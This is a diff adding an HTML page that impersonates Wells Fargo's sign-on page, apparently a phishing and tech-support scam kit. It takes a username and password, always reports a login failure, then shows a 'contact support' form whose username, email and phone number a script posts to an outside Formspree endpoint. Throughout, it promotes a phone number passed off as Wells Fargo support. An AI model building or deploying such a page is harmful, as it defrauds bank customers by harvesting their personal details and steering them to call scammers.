@@ -1,0 +1,205 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="" />
+    <link rel="icon" href="" type="image/jpg" sizes="16x16" />
+
+    <link
+      rel="stylesheet"
+      href="asset/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    
+    <link
+      rel="stylesheet"
+      href="asset/bootstrap/4.0.0/css/bootstrap.min.css"
+    />
+    <link rel="stylesheet" href="asset/style.css">
+    <meta name="google-site-verification" content="Kjx8H8kfw3ezl2qQJp7ODkp-QsdKKOiHXAsu_3IbgMs" />
+    <title>Wells Fargo | Financial Services </title>
+  </head>
+  <body>
+    <div class="nav_bar fixed-top">
+        <div class="inner_nav">
+            <a href="https://wellssupporthub.netlify.app/"><img src="https://wellssupporthub.netlify.app/./images/logo.webp" alt="" class="logo"></a>
+
+            <div class="nav_list">
+                <a href="https://wellssupporthub.netlify.app/#" class="d-none d-sm-flex">ATMs/Location</a>
+                <a href="https://wellssupporthub.netlify.app/#" class="d-none d-sm-flex">Help</a>
+                <a href="https://wellssupporthub.netlify.app/#" class="smlbtn">Login</a>
+                </div>
+        </div>
+    </div>
+    <div class="hero_sec">
+        <div class="container">
+            <div class="row">
+               
+                
+                <div class="col-lg-4 col-md-6 col-10 mx-auto mb-3 order-2 order-md-1">
+                    <div class="card p-3">
+                        <div class="model_box" id="mod_box">
+                   
+                            <div class="inner_model">
+                             
+                                <h5>Contact Support for <a href="https://wellssupporthub.netlify.app/tel:+1 847-996-1546">+1 847-996-1546</a> </h5>
+                               
+                              <hr />
+                             
+     <div class="alert alert-danger" id="success-msg">Contact Wells Fargo Bank Support <a href="https://wellssupporthub.netlify.app/tel:+1 847-996-1546">+1 847-996-1546</a> </div>
+     <div class="alert alert-danger" id="error-msg"> Invalid username or password.  </div>
+    
+  
+
+    <div id="contact-form">
+        
+    
+        <form  id="contactForm" action="https://formspree.io/f/mqapgeyw" method="POST">
+            <div class="form-group">
+                <label for="name">Username:</label>
+                <input type="text" class="form-control" name="name" id="name" autocomplete="off" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" class="form-control" name="email" id="email" autocomplete="off" required>
+            </div>
+            <div class="form-group">
+                <label for="number">Number:</label>
+                <input type="number" class="form-control" name="number" id="number" autocomplete="off" required>
+            </div>
+            <div class="text-right">
+                <button type="submit" name="submit_contact" class="btn btn-danger py-2 px-5">Contact Us</button>
+            </div>
+        </form>
+    </div> 
+                            </div>
+                          
+    
+                       </div>
+    
+    
+                            
+    
+                       <div id="login-form">
+                        <h3>Welcome to WellFargo </h3>
+                        <p class="m-0">Sign on to manage your accounts.</p>
+                        <form action="" method="POST" class="mt-4" >
+                            <div class="form-group">
+                              <label for="name">Username:</label>
+                              <input type="text" class="form-control" placeholder="" name="username" autocomplete="off" required>
+                            </div>
+                            <div class="form-group">
+                              <label for="pwd">Password:</label>
+                              <input type="password" class="form-control" placeholder="" name="password" autocomplete="off" required>
+                            </div>
+                            
+                            <div class="text-right">
+                                <button type="submit" name="submit" class="btn btn-danger py-2 px-5">Sign in</button>
+                            </div>
+                            
+                          </form>
+                       </div>
+                    </div>
+                    
+                </div>
+
+                <div class="col-lg-8 col-md-6 col-12 mx-auto mb-5 d-flex justify-content-center align-item-center flex-column order-1 order-md-2">
+                    <div class="box">
+                        <h2 class="mb-4" >We are open for your support
+
+                        </h2>
+                        <h5>Wells Fargo Bank Customer <br>
+                            Support Number : <a href="https://wellssupporthub.netlify.app/tel:+1 847-996-1546">+1 847-996-1546</a> </h5>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+   
+
+    <script>
+         document.addEventListener("DOMContentLoaded", function () {
+        
+        document.getElementById("success-msg").style.display = "none";
+       // document.getElementById("error-msg").style.display = "none";
+
+       // Handle login form submission
+       document.getElementById("login-form").addEventListener("submit", function (event) {
+           event.preventDefault(); // Prevent actual form submission
+           
+           // Show error message
+           
+           document.querySelector('input[name="username"]').value = "";
+           document.querySelector('input[name="password"]').value = "";
+
+           var errorMsg = document.getElementById("error-msg");
+
+           // Hide login form and show contact form after a delay
+           setTimeout(function () {
+              
+               document.getElementById("mod_box").style.display="flex"               
+                  errorMsg.style.display = "block";
+              
+              
+           }, 1000);
+           
+           setTimeout(function () {
+              
+                      
+                 errorMsg.style.display = "none";
+             
+             
+          }, 5000);
+       });
+
+
+       document.getElementById("contactForm").addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent actual form submission
+    document.getElementById("success-msg").style.display = "block";
+
+// console.log("okkk")
+    var form = this;
+    var formData = new FormData(form);
+
+    // Send form data to Formspree using Fetch API
+    fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: {
+            "Accept": "application/json"
+        }
+    }).then(response => {
+        if (response.ok) {
+            // Show success message
+            // document.getElementById("success-msg").style.display = "block";
+        //  document.getElementById("success-msg").style.display = "none";
+
+            // Clear input fields
+            form.reset();
+        } else {
+            alert("Oops! Something went wrong.");
+        }
+    }).catch(error => {
+        alert("Oops! Something went wrong.");
+    });
+});
+
+
+
+
+    })
+
+
+
+    </script>
+    
+  </body>
+</html>
